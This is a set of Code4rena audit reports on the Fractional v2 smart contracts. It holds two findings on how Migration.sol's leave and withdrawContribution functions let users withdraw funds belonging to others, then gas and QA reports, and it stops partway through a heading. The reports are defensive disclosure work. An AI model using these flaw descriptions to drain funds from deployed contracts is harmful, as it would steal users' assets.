# Lines of code  https://github.com/code-423n4/2022-07-fractional/blob/main/src/modules/Migration.sol#L141   # Vulnerability details  The `leave` function allows to leave a proposal even if the proposal has been committed and failed. This makes it a (probably unintended) duplicate functionality of `withdrawContributions`, which is the function that should be used to withdraw failed contributions.  ## Impact User assets might be lost: When withdrawing assets from a failed migration, users should get back a different amount of assets, according to the buyout auction result. (I detailed this in another issue - "Migration::withdrawContribution falsely assumes that user should get exactly his original contribution back"). But when withdrawing assets from a proposal that has not been committed, users should get back their original amount of assets, as that has not changed. Therefore, if `leave` does not check if the proposal has been committed, users could call `leave` instead of `withdrawContribution` and get back a different amounts of assets than they deserve, on the expense of other users.  ## Proof of Concept The `leave` function [does not check](https://github.com/code-423n4/2022-07-fractional/blob/main/src/modules/Migration.sol#L141) anywhere whether `proposal.isCommited == true`. Therefore, if a user calls it after a proposal has been committed and failed, it will continue to send him his original contribution back, instead of sending him the adjusted amount that has been returned from Buyout.  ## Recommended Mitigation Steps Revert in `leave` if `proposal.isCommited == true`. You might be also able to merge the functionality of `leave` and `withdrawContribution`, but that depends on how you will implement the fix for `withdrawContribution`.  
# Lines of code  https://github.com/code-423n4/2022-07-fractional/blob/main/src/modules/Migration.sol#L308 https://github.com/code-423n4/2022-07-fractional/blob/main/src/modules/Migration.sol#L321 https://github.com/code-423n4/2022-07-fractional/blob/main/src/modules/Migration.sol#L312 https://github.com/code-423n4/2022-07-fractional/blob/main/src/modules/Migration.sol#L325   # Vulnerability details  When a user calls `withdrawContribution`, it will try to send him back his original contribution for the proposal. But if the proposal has been committed, and other users have interacted with the buyout, Migration will receive back a different amount of ETH and tokens. Therefore it shouldn't send the user back his original contribution, but should send whatever his share is of whatever was received back from Buyout.  ## Impact Loss of funds for users. Some users might not be able to withdraw their contribution at all, and other users might withdraw funds that belong to other users. (This can also be done as a purposeful attack.)  ## Proof of Concept A summary is described at the top.  It's probably not needed, but the here's the flow in detail. When a user joins a proposal, Migration [saves](https://github.com/code-423n4/2022-07-fractional/blob/main/src/modules/Migration.sol#L124:#L135) his contribution: ```         userProposalEth[_proposalId][msg.sender] += msg.value;         userProposalFractions[_proposalId][msg.sender] += _amount; ``` Later when the user would want to withdraw his contribution from a failed migration, Migration would [refer](https://github.com/code-423n4/2022-07-fractional/blob/main/src/modules/Migration.sol#L308:#L325) to these same variables to decide how much to send to the user: ```         uint256 userFractions = userProposalFractions[_proposalId][msg.sender];         IFERC1155(token).safeTransferFrom(address(this), msg.sender, id, userFractions, "");         uint256 userEth = userProposalEth[_proposalId][msg.sender];         payable(msg.sender).transfer(userEth); ```  But if the proposal was committed, and other users interacted with the buyout, then the amount of ETH and tokens that Buyout sends back is not the same contribution. For example, if another user called `buyFractions` for the buyout, it [will decrease](https://github.com/code-423n4/2022-07-fractional/blob/main/src/modules/Buyout.sol#L168) the amount of tokens in the pool: ```         IERC1155(token).safeTransferFrom(address(this), msg.sender, id, _amount, ""); ``` And when the proposal will end, if it has failed, Buyout will [send back](https://github.com/code-423n4/2022-07-fractional/blob/main/src/modules/Buyout.sol#L228) to Migration [the amount](https://github.com/code-423n4/2022-07-fractional/blob/main/src/modules/Buyout.sol#L206) of tokens in the pool: ```         uint256 tokenBalance = IERC1155(token).balanceOf(address(this), id);         ...         IERC1155(token).safeTransferFrom(address(this), proposer, id, tokenBalance, ""); ``` (**Same will happen for the ETH amount)  Therefore, Migration will receive back less tokens than the original contribution was. When the user will try to call `withdrawContribution` to withdraw his contribution from the pool, Migration would [try to send](https://github.com/code-423n4/2022-07-fractional/blob/main/src/modules/Migration.sol#L310) the user's original contribution. But there's a deficit of that. If other users have contributed the same token, then it will transfer their tokens to the user. If not, then the withdrawal will simply revert for insufficient balance.  ## Recommended Mitigation Steps I am not sure, but I think that the correct solution would be that upon a failed proposal's end, there should be a hook call from Buyout to the proposer - in our situation, Migration. Migration would then see(/receive as parameter) how much ETH/tokens were received, and update the proposal with the change needed. eg. send to each user 0.5 his tokens and 1.5 his ETH. In another issue I submitted, "User can't withdraw assets from failed migration if another buyout is going on/succeeded", I described for a different reason why such a callback to Migration might be needed. Please see there for more implementation suggestion. I think this issue shows that indeed it is needed.  
### [G01] Custom Errors There are a couple of files that have yet to be upgraded to custom errors. Based on the following test in remix you can save 12,404 in deployment costs per custom error and 86 gas on each function call.  ```  contract Test {  uint256 a;  function check() external {   require(a != 0, "check failed");  } }   (Deployment cost: 114,703, Cost on Function call: 23,392) vs  contract Test {  uint256 a;  error checkFailed();  function check() external {   if (a != 0) revert checkFailed();  } }   (Deployment cost: 102,299, Cost on Function call: 23,306) ```  Instances where custom errors can be implemented: [FERC1155.sol#L263-L268](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/FERC1155.sol#L263-L268) [FERC1155.sol#L275-L286](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/FERC1155.sol#L275-L286) [FERC1155.sol#L297](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/FERC1155.sol#L297) [MerkleBase.sol#L62](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/utils/MerkleBase.sol#L62) [MerkleBase.sol#L78](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/utils/MerkleBase.sol#L78)   ### [G02] Shorten Revert Messages If you opt not to use custom errors keeping revert strings <= 32 bytes in length will save gas.  I ran a test in remix and found the savings for a single short revert string vs long string to be 9,377 gas in deployment cost and 18 gas on function call.  ``` solidity contract Test {  uint256 a;  function check() external {   require(a != 0, "short error message");    (Deployment cost: 114,799, Cost on function call: 23,392)    vs    require(a != 0, "A longer Error Message over 32 bytes in              length");    (Deployment cost: 124,176, Cost on function call: 23,410)   } } ```  I recommend shortenning the following revert strings to < 32 bytes in length: [MerkleBase.sol#L62](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/utils/MerkleBase.sol#L62) [MerkleBase.sol#L78](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/utils/MerkleBase.sol#L78)   ### [G03] Loop Optimisation When incrementing i in for loops there is no chance of overflow so unchecked can be used to save gas. Pre increments can also be used to save a small amount of gas per iteration (~5 gas). I ran a simple test in remix and found deployment savings of 31,901 gas and on each function call saved ~144 gas per iteration.  ``` solidity contract Test {  function loopTest() external {   for (uint256 i; i < 1; i++) {   Deployment Cost: 125,885, Cost on function call: 24,604   vs   for (uint256 i; i < 1; ) {   // for loop body   unchecked { ++i; }   Deployment Cost: 93,984, Cost on function call: 24,460   }  } } ```  For loops that can use unchecked/pre increments: [Vault.sol#L104](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/Vault.sol#L104)   ### [G04] State Variables that can be Immutable Variables that are initialised in the constructor and then never modified can be changed to immutable. Based on the following test in remix switching to immutable variables can save 26,376 in deployment costs and 2,456 whenever referencing the variable.  ``` solidity contract Test {  address public supply;   (Deployment Cost: 167,940, Cost on function call: 26,861)  vs  address public immutable supply;  (Deployment Cost: 141,564, Cost on function call: 24,405)   constructor(address _supply) {   supply = _supply;  }    function test() external {   address testAddress = supply; // to test referencing gas costs  } } ```  Variables that can be changed to immutable: [Buyout.sol#L29-L33](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Buyout.sol#L29-L33) - registry, supply & transfer are all set in the constructor and never modified. [Minter.sol#L14](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Minter.sol#L14) - supply is never modified [Migration.sol#L37-L39](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Migration.sol#L37-L39) - buyout & registry are never modified [VaultFactory.sol#L15](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/VaultFactory.sol#L15) - implementation is never modified   ### [G05] x = x + y is Cheaper than x += y  Based on test in remix you can save ~1,007 gas on deployment and ~15 gas on execution cost if you use x = x + y over x += y. (Is only true for storage variables)  ``` solidity contract Test {  uint256 x = 1;  function test() external {   x += 3;    (Deployment Cost: 153,124, Execution Cost: 30,369)   vs   x = x + 1;   (Deployment Cost: 152,117, Execution Cost: 30,354)  }  } ```  Instances where x = x + y/x = x - y can be implemented: [FERC1155.sol#L62](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/FERC1155.sol#L62) [FERC1155.sol#L86](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/FERC1155.sol#L86) [Buyout.sol#L139](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Buyout.sol#L139) [Buyout.sol#L176](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Buyout.sol#L176) [Migration.sol#L123-L124](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Migration.sol#L123-L124) [Migration.sol#L134-L135](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Migration.sol#L134-L135)  [Migration.sol#L156](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Migration.sol#L156) [Migration.sol#L160](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Migration.sol#L160)   ### [G06] Minimise SLOAD's Whenever referencing a state variable more than once in a function without modifying it, you can save ~97 gas per use by caching the value. (normally 100 gas each use vs 103 gas to SLOAD/MSTORE for the first use and then only 3 gas for further uses)  [FERC1155.sol#L246-L247](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/FERC1155.sol#L246-L247) - can cache royaltyPercent[_ id])(save ~94 gas) [FERC1155.sol#L303-L305](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/FERC1155.sol#L303-L305) - can cache _ controller (save ~94 gas) [Buyout.sol#L476-L477](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Buyout.sol#L476-L477) - can cache supply (save ~94 gas) [Buyout.sol#L482-L501](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Buyout.sol#L482-L501) - can cache transfer (save ~679 gas) [Migration.sol#L81-L95](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Migration.sol#L81-L95) - can cache registry (save ~94 gas)   ### [G07] Deleting Mappings is Cheaper than setting to Default Value Based on this test in remix you can save ~511 gas in deployment costs and ~6 gas on each function call by using delete instead of setting a mapping to the default value.  ``` solidity contract Test {  mapping (address => uint256) public withdrawals;  function test(address a) external {   withdrawals[a] = 0;   (Deployment cost: 180,368, Execution cost: 27,820)   vs   delete withdrawals[a];   (Deployment cost: 179,857, Execution cost: 27,814)  } } ```  Instances where mappings are being set to their default value: [Vault.sol#L105](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/Vault.sol#L105) [Migration.sol#L161](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Migration.sol#L161) [Migration.sol#L323](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Migration.sol#L323) [Migration.sol#L157](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Migration.sol#L157) [Migration.sol#L310](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Migration.sol#L310)   ### [G08] Functions that can be Payable Functions that will always revert when regular users call them (such as those that can only be called by owner/controller) can be marked payable to save a small amount of gas (~24 Gas when function is called based on remix test)  [FERC1155.sol#L205-L207](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/FERC1155.sol#L205-L207) [FERC1155.sol#L198](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/FERC1155.sol#L198) [FERC1155.sol#L217-L221](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/FERC1155.sol#L217-L221) [FERC1155.sol#L229-L231](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/FERC1155.sol#L229-L231) [Vault.sol#L73](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/Vault.sol#L73) [Vault.sol#L86](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/Vault.sol#L86) [Vault.sol#L93](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/Vault.sol#L93) [Vault.sol#L101](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/Vault.sol#L101)   ### [G09] Public Function that can be External The following functions are never called in their contracts and can be switched from public to external to save gas: [MerkleBase.sol#L43-L47](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/utils/MerkleBase.sol#L43-L47) [MerkleBase.sol#L61](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/utils/MerkleBase.sol#L61) [MerkleBase.sol#L73-L74](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/utils/MerkleBase.sol#L73-L74) [Metadata.sol#L36](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/utils/Metadata.sol#L36) [SelfPermit.sol#L18-L26](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/utils/SelfPermit.sol#L18-L26) [SelfPermit.sol#L46-L53](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/utils/SelfPermit.sol#L46-L53)
# QA Report  # Documentation errors.  Some of the documentation mentions that Buyouts need 51% support but the code shows that, in reality, it is anything strictly greater than 50%. e.g. 50.0001%  See [Buyout.sol:208-211](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Buyout.sol#L208-L211)  # Non-critical: Use `permissions.size` to intialize `nodes` in `Buyout.getLeafNodes`  Instead of using the magic number 5 on [line 451](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Buyout.sol#L451) why not simply use `permissions.length` to allocate the correct number of array indices?  Like so:  ```solidity function getLeafNodes() external view returns (bytes32[] memory nodes) {     Permission[] memory permissions = getPermissions();     nodes = new bytes32[](permissions.length);     for (uint256 i; i < permissions.length; ) {         // Hashes permission into leaf node         nodes[i] = keccak256(abi.encode(permissions[i]));         // Can't overflow since loop is a fixed size         unchecked {             ++i;         }     } } ```  ## Low Risk: `BaseVault.generateMerkleTree` will not work with new targets when total leaf length is greater than 6  ### Impact  Function `BaseVault.deployVault` takes a `modules` parameter which allows for any set of modules to be used with the contract.  If those modules have targets which have a total number of leaf nodes greater than 6 then `generateMerkleTree` will revert, which in turn causes `deployVault` to revert.  The impact is that one can successfully create a `BaseVault` but not call `deployVault`.  ### Proof of Concept  - Create a new instance of `BaseVault` called `baseVault`. - Call `baseVault.deployVault` with [modules](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/protoforms/BaseVault.sol#L36) parameter which, collectively, have more than 6 leaf nodes. - Observe a revert with "Index out of bounds"  ### Tools used  Manual Inspection  ### Recommended Mitigation Steps  If the intention of `BaseVault` is to allow arbitrary modules then one could rewrite `generateMerkleTree` as follows.  ```solidity function generateMerkleTree(address[] calldata _modules)     public     view     returns (bytes32[] memory hashes) {     uint256 numLeaves;     uint256 counter;     bytes32[][] memory leavesList = new bytes32[][](_modules.length);      // Get leaf nodes      unchecked {         for (uint256 i; i < _modules.length; ++i) {             bytes32[] memory leaves = IModule(_modules[i]).getLeafNodes();             leavesList[i] = leaves;             numLeaves += leaves.length;         }     }      hashes = new bytes32[](numLeaves);     unchecked {         for (uint256 i; i < leavesList.length; ++i) {             bytes32[] memory leaves = leavesList[i];             for (uint256 j; j < leaves.length; ++j) {                 hashes[counter++] = leaves[j];             }         }     } } ```  If the intention is for it only to allow `Supply` and `Buyout` modules then simply add some checks with `require` statements.  ## Low Risk: There is no way to get ETH out of `Vault` when accidentally sent to it  There is no function to retrieve ETH accidentally sent to the `Vault` contract.  ## Low Risk: `BaseVault` batch deposit functions do not check arrays are of the same length  The functions `batchDepositERC20`, `batchDepositERC721`, and `batchDepositERC1155` all fail to check that the length of the their array arguments have the same length.  Although this only results in a revert, it will result in increased gas use.
# Summary | Issue | Instances | | ------ | :--------: | | `++i` uses less gas compared to `i++` | 3 | | `uint8` incures more gas overhead compared to `uint256` | 2 | | Use custom errors instead of `revert()`/`require()` to save gas | 3 | | Add `require()` earlier in functions | 1 | | Cache array length outside of loop | 4 | | `internal` functions that are only called once can be inlined to save gas | 5 | | Return values directly without an intermediate return variable | 6 |  | Let the default value `0` be applied to variables initialized to `0` | 2 | | Functions guaranteed to revert when called by normal users can be marked `payable` | 8 | | `public` functions not called by the contract should be declared `external` | 6 |     # Gas Optimisations  ## `++i` uses less gas compared to `i++`   This is especially relevant for the use of `i++` in `for` loops. This saves 6 gas per loop.   _There are 3 instances of this issue:_  ``` File: src/Vault.sol  78     for (uint256 i = 0; i < length; i++) { 79         methods[_selectors[i]] = _plugins[i]; 80:    } ``` https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/Vault.sol#L78-L80  ``` File: src/Vault.sol  104    for (uint256 i = 0; i < length; i++) { 105        methods[_selectors[i]] = address(0); 106:   } ``` https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/Vault.sol#L104-L106  ``` File:  src/utils/MerkelBase.sol  186    while (x > 0) { 187       x >>= 1; 188       ceil++; 189:   } ``` https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/utils/MerkleBase.sol#L186-L189  ## `uint8` incures more gas overhead compared to `uint256`  _There are 2 instances of this issue:_  ``` File: src/FERC1155.sol  98    function permit( 99        address _owner, 100        address _operator, 101        uint256 _id, 102        bool _approved, 103        uint256 _deadline, 104        uint8 _v, 105        bytes32 _r, 106        bytes32 _s 107:    ) external { ``` https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/FERC1155.sol#L98-L107  ``` File: src/FERC1155.sol  145    function permitAll( 146        address _owner, 147        address _operator, 148        bool _approved, 149        uint256 _deadline, 150        uint8 _v, 151        bytes32 _r, 152        bytes32 _s 153:    ) external { ``` https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/FERC1155.sol#L145-L153  ## Use custom errors instead of `revert()`/`require()` to save gas Custom errors are available from solidity version 0.8.4. The instances below match or exceed that version.  _There are 3 instances of this issue:_  ``` File: src/FERC1155.sol  263  require( 264  msg.sender == _from || 265   isApprovedForAll[_from][msg.sender] || 267   isApproved[_from][msg.sender][_id], 268  "NOT_AUTHORIZED" 269: ); ``` https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/FERC1155.sol#L263-L269  ``` File: src/FERC1155.sol  275  require( 276  _to.code.length == 0 277   ? _to != address(0) 278   : INFTReceiver(_to).onERC1155Received( 279    msg.sender, 280    _from, 281    _id, 282    _amount, 283    _data 284   ) == INFTReceiver.onERC1155Received.selector, 285  "UNSAFE_RECIPIENT" 286:  ); ``` https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/FERC1155.sol#L275-L286  ``` File: src/FERC1155.sol  297: require(metadata[_id] != address(0), "NO METADATA"); ``` https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/FERC1155.sol#L297   ## Add `require()` earlier in functions This saves gas on operations between the start of the function and where the `require` function is actually being called.   _There is 1 instance of this issue:_  ``` File: src/FERC1155.sol  276  require( 277  _to.code.length == 0 278   ? _to != address(0) 279   : INFTReceiver(_to).onERC1155Received( 280    msg.sender, 281    _from, 282    _id, 283    _amount, 284    _data 285   ) == INFTReceiver.onERC1155Received.selector, 286  "UNSAFE_RECIPIENT" 287:  ); ``` https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/FERC1155.sol#L276-L287   ## Cache array length outside of loop Reading array length at each iteration of the loop takes 6 gas (3 for mload and 3 to place memory_offset) in the stack.  Caching the array length in the stack saves around 3 gas per iteration. To do this, create a variables containing the array length before the loop.    _There are 4 instances of this issue:_  ``` File: src/modules/Buyout.sol  276:  for (uint256 i; i < permissions.length; ) { ``` https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/modules/Buyout.sol#L454  ``` File: src/utils/MerkleBase.sol  51:  for (uint256 i = 0; i < _proof.length; ++i) { ``` https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/utils/MerkleBase.sol#L51  ``` File: src/utils/MerkleBase.sol  63:   while (_data.length > 1) { ``` https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/utils/MerkleBase.sol#L63  ``` File: src/utils/MerkleBase.sol  110: for (uint256 i; i < result.length; ++i) { ``` https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/utils/MerkleBase.sol#L110   ## `internal` functions that are only called once can be inlined to save gas Depending on the function contents, this will save 20~40 gas by omiting two JUMP operations and stack operations needed for the function call.   _There are 5 instances of this issue:_  ``` File: src/FERC1155.sol  324  function _computePermitStructHash( 325    address _owner, 326    address _operator, 327    uint256 _id, 328    bool _approved, 329    uint256 _deadline 330:  ) internal returns (bytes32) { ``` https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/FERC1155.sol#L324-L330  ``` File: src/FERC1155.sol  350    function _computePermitAllStructHash( 351        address _owner, 352        address _operator, 353        bool _approved, 354        uint256 _deadline 355:   ) internal returns (bytes32) { ``` https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/FERC1155.sol#L350-L355  ``` File: src/Vault.sol  142    function _revertedWithReason(bytes memory _response) internal pure { 143        assembly { 144            let returndata_size := mload(_response) 145            revert(add(32, _response), returndata_size) 146        } 147:    } ``` https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/Vault.sol#L142-L147  ``` File: src/utils/Multicall.sol  39    function _revertedWithReason(bytes memory _response) internal pure { 40        assembly { 41            let returndata_size := mload(_response) 42            revert(add(32, _response), returndata_size) 43        } 44:    } ``` https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/utils/Multicall.sol#L39-L44  ``` File: src/utils/SafeSend.sol  18    function _attemptETHTransfer(address _to, uint256 _value) 19        internal 20        returns (bool success) 21:    { ``` https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/utils/SafeSend.sol#L18-L21  ## Return values directly without an intermediate return variable Initializing a return variable for a function, then assigning a value to it requires more gas compared to simply returning the value, as long as the variable is not being used elsewhere in the function.   _There are 6 instances of this issue:_  ``` File: src/Vault.sol  67:  (success, response) = _execute(_target, _data); ``` https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/Vault.sol#L49-L68  ``` File: src/VaultFactory.sol  26    function deploy() external returns (address payable vault) { 27        vault = deployFor(msg.sender); 28:    } ``` https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/VaultFactory.sol#L26-L28  ``` File: src/VaultFactory.sol  49:        vault = address(uint160(uint256(data))); ``` https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/VaultFactory.sol#L33-L50  ``` File: src/VaultRegistry.sol  51    function create( 52        bytes32 _merkleRoot, 53       address[] memory _plugins, 54        bytes4[] memory _selectors 55    ) external returns (address vault) { 56        vault = _deployVault(_merkleRoot, address(fNFT), _plugins, _selectors); 57:   } ``` https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/VaultRegistry.sol#L51-L57  ``` File: src/VaultRegistry.sol  83    function createCollection( 84        bytes32 _merkleRoot, 85        address[] memory _plugins, 86        bytes4[] memory _selectors 87    ) external returns (address vault, address token) { 88        (vault, token) = createCollectionFor( 89            _merkleRoot, 90            msg.sender, 91            _plugins, 92            _selectors 93        ); 94:   } ``` https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/VaultRegistry.sol#L83-L94  ``` File: src/VaultRegistry.sol  102    function createInCollection( 103        bytes32 _merkleRoot, 104        address _token, 105        address[] memory _plugins, 106        bytes4[] memory _selectors 107    ) external returns (address vault) { 108        address controller = FERC1155(_token).controller(); 109        if (controller != msg.sender) 110            revert InvalidController(controller, msg.sender); 111        vault = _deployVault(_merkleRoot, _token, _plugins, _selectors); 112:   } ``` https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/VaultRegistry.sol#L102-L112  ## Let the default value `0` be applied to variables initialized to `0` Letting the default value of `0` be initialized to variables costs less gas compared to initializing it to a value of `0`.   _There are 2 instances of this issue:_  ``` File: src/Vault.sol  78:   for (uint256 i = 0; i < length; i++) { ``` https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/Vault.sol#L78  ``` File: src/utils/MerkleBase.sol  51:   for (uint256 i = 0; i < _proof.length; ++i) { ``` https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/utils/MerkleBase.sol#L51   ## Functions guaranteed to revert when called by normal users can be marked `payable`  For example, a function modifier such as `onlyController` is used. Adding the `payable` marker will lower gas cost for legitimate callers because the compiler will not include checks for whether a payment was provided. Saves about 21 gas per call to the function, as well as saving on deployment cost.   _There are 8 instances of this issue:_  ``` File: src/FERC1155.sol  56    function burn( 57        address _from, 58        uint256 _id, 59        uint256 _amount 60:    ) external onlyRegistry { ``` https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/FERC1155.sol#L56-L60  ``` File: src/FERC1155.sol  79    function mint( 80        address _to, 81        uint256 _id, 82        uint256 _amount, 83        bytes memory _data 84:   ) external onlyRegistry { ``` https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/FERC1155.sol#L79-L84  ``` File: src/FERC1155.sol  198:   function setContractURI(string calldata _uri) external onlyController { ``` https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/FERC1155.sol#L198  ``` File: src/FERC1155.sol  205    function setMetadata(address _metadata, uint256 _id) 206        external 207        onlyController 208:   { ``` https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/FERC1155.sol#L205-L208  ``` File: src/FERC1155.sol  217    function setRoyalties( 218        uint256 _id, 219        address _receiver, 220        uint256 _percentage 221:   ) external onlyController { ``` https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/FERC1155.sol#L217-L221  ``` File: src/FERC1155.sol  229    function transferController(address _newController) 230        external 231        onlyController 232:   { ``` https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/FERC1155.sol#L229-L232  ``` File: src/VaultRegistry.sol  39    function burn(address _from, uint256 _value) external { 40        VaultInfo memory info = vaultToToken[msg.sender]; 41        uint256 id = info.id; 42        if (id == 0) revert UnregisteredVault(msg.sender); 43        FERC1155(info.token).burn(_from, id, _value); 44:    } ``` https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/VaultRegistry.sol#L39-L44  ``` File: src/VaultRegistry.sol  117    function mint(address _to, uint256 _value) external { 118        VaultInfo memory info = vaultToToken[msg.sender]; 119        uint256 id = info.id; 120        if (id == 0) revert UnregisteredVault(msg.sender); 121        FERC1155(info.token).mint(_to, id, _value, ""); 122:   } ``` https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/VaultRegistry.sol#L117-L122  ## `public` functions not 